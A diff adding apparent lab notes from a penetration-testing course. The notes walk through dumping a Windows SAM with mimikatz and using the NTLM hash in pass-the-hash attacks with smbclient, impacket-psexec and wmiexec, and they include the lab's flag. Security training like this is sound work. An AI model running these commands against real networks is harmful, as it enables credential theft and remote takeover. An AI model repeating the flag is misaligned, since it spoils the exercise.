@@ -1,0 +1,51 @@
+Questions
+Use the methods from this section to get access to VM #2 and find the flag on the desktop of the user Administrator.
+HINT
+Connect to VM #1 via RDP with the provided credentials.
+Use the provided commands in Listing 43 and mimikatz is located on C:\tools\ .
+After you have obtained the NTLM hash, use the commands provided in Listing 44 to connect your .212 machine.
+
+nmap -sS 192.168.190.211-212
+192.168.190.211
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+4444/tcp open  krb524
+5555/tcp open  freeciv
+
+192.168.190.212
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+
+xfreerdp /u:gunther /p:password123! /v:192.168.190.211 /drive:smbfolder,/home/kali/Desktop
+
+# Open Powershell in Administrator
+cd C:\tools\
+.\mimikatz.exe 
+mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+User : Administrator
+  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+
+To leverage pass-the-hash (PtH), we need tools that support authentication with NTLM hashes.
+For SMB enumeration and management, we can use smbclient or CrackMapExec For command execution, we can use the scripts from the impacket4 library like psexec.py and wmiexec.py.
+
+smbclient \\\\192.168.190.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+
+smb> get secrets.txt
+
+# Then we can use impacket-psexec on Kali to use NTLM hashes to authenticate to the target
+
+impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+
+C:\Users\Administrator\Desktop> type flag.txt
+OS{2b68b68f26cacd0c5d1a80d7250a1782}
+
+# We can also use other impacket script like wmiexec.py to obtain shell as the user
+impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.190.212
+
